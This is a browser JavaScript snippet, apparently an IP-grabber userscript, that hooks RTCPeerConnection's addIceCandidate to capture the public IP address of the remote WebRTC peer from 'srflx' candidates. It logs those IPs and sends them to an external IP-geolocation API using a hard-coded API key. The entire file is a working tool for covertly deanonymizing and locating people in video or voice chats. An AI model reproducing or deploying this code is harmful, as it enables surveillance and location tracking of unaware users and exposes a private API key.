// Read README before using!

window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function(...args) {
    const pc = new window.oRTCPeerConnection(...args);

    pc.oaddIceCandidate = pc.addIceCandidate;

    pc.addIceCandidate = function(iceCandidate, ...rest) {
        const field = iceCandidate.candidate.split(" ");
        console.log(iceCandidate.candidate);
        const ip_resolved = field[4];
        if (field[7] === "srflx") {
            Network(ip_resolved);
        }
        return pc.oaddIceCandidate(iceCandidate, ...rest);
    };
    return pc;
};

let Network = async(ip_resolved) => {
    let web = `https://api.ipgeolocation.io/ipgeo?apiKey=09a0deec14c546b0a3fdc2175c95fdfa&ip=${ip_resolved}`;

    await fetch(web).then((response) =>
        response.json().then((json) => {})
    );
};
